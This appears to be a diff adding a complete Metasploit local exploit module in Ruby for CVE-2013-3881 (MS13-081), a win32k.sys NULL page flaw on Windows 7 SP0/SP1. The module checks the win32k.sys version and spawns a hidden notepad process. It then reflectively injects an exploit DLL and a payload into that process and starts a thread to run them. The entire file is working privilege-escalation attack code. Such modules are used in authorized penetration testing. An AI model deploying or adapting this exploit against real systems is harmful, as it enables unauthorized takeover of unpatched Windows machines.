@@ -1,0 +1,133 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'msf/core/post/windows/reflective_dll_injection'
+require 'rex'
+
+class Metasploit3 < Msf::Exploit::Local
+  Rank = AverageRanking
+
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::Process
+  include Msf::Post::Windows::FileInfo
+  include Msf::Post::Windows::ReflectiveDLLInjection
+
+  def initialize(info={})
+    super(update_info(info, {
+      'Name'           => 'Windows TrackPopupMenuEx Win32k NULL Page',
+      'Description'    => %q{
+        This module exploits a vulnerability in win32k.sys where under
+        specific conditions TrackPopupMenuEx will pass a NULL pointer to
+        the MNEndMenuState procedure. This module has been tested
+        successfully on Windows 7 SP0 and Windows 7 SP1.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Seth Gibson', # vulnerability discovery
+          'Dan Zentner', # vulnerability discovery
+          'Matias Soler', # vulnerability analysis
+          'Spencer McIntyre'
+        ],
+      'Arch'           => ARCH_X86,
+      'Platform'       => 'win',
+      'SessionTypes'   => [ 'meterpreter' ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread',
+        },
+      'Targets'        =>
+        [
+          [ 'Windows 7 SP0/SP1', { } ]
+        ],
+      'Payload'        =>
+        {
+          'Space'       => 4096,
+          'DisableNops' => true
+        },
+      'References'     =>
+        [
+          [ 'CVE', '2013-3881' ],
+          [ 'OSVDB', '98212' ],
+          [ 'BID', '62830'],
+          [ 'MSB', 'MS13-081' ],
+          [ 'URL', 'http://endgame.com/news/microsoft-win32k-null-page-vulnerability-technical-analysis.html' ],
+          [ 'URL', 'http://immunityproducts.blogspot.com/2013/11/exploiting-cve-2013-3881-win32k-null.html' ]
+        ],
+      'DisclosureDate' => 'Oct 08 2013',
+      'DefaultTarget'  => 0
+    }))
+  end
+
+  def check
+    os = sysinfo["OS"]
+    if (os =~ /windows/i) == nil
+      return Exploit::CheckCode::Unknown
+    end
+
+    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
+    major, minor, build, revision, branch = file_version(file_path)
+    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")
+
+    case build
+    when 7600
+      return Exploit::CheckCode::Vulnerable
+    when 7601
+      return Exploit::CheckCode::Vulnerable if revision <= 18126
+    when 9200
+      return Exploit::CheckCode::Safe
+    end
+    return Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    if is_system?
+      fail_with(Exploit::Failure::None, 'Session is already elevated')
+    end
+
+    if check != Exploit::CheckCode::Vulnerable
+      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
+    end
+
+    if sysinfo["Architecture"] =~ /wow64/i
+      fail_with(Failure::NoTarget, "Running against WOW64 is not supported")
+    elsif sysinfo["Architecture"] =~ /x64/
+      fail_with(Failure::NoTarget, "Running against 64-bit systems is not supported")
+    end
+
+    print_status("Launching notepad to host the exploit...")
+    notepad_process = client.sys.process.execute("notepad.exe", nil, {'Hidden' => true})
+    begin
+      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
+      print_good("Process #{process.pid} launched.")
+    rescue Rex::Post::Meterpreter::RequestError
+      # Reader Sandbox won't allow to create a new process:
+      # stdapi_sys_process_execute: Operation failed: Access is denied.
+      print_status("Operation failed. Trying to elevate the current process...")
+      process = client.sys.process.open
+    end
+
+    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
+    library_path = ::File.join(Msf::Config.data_directory, "exploits",
+                               "cve-2013-3881", "cve-2013-3881.x86.dll")
+    library_path = ::File.expand_path(library_path)
+
+    print_status("Injecting exploit into #{process.pid}...")
+    exploit_mem, offset = inject_dll_into_process(process, library_path)
+
+    print_status("Exploit injected. Injecting payload into #{process.pid}...")
+    payload_mem = inject_into_process(process, payload.encoded)
+
+    # invoke the exploit, passing in the address of the payload that
+    # we want invoked on successful exploitation.
+    print_status("Payload injected. Executing exploit...")
+    process.thread.create(exploit_mem + offset, payload_mem)
+
+    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
+  end
+
+end
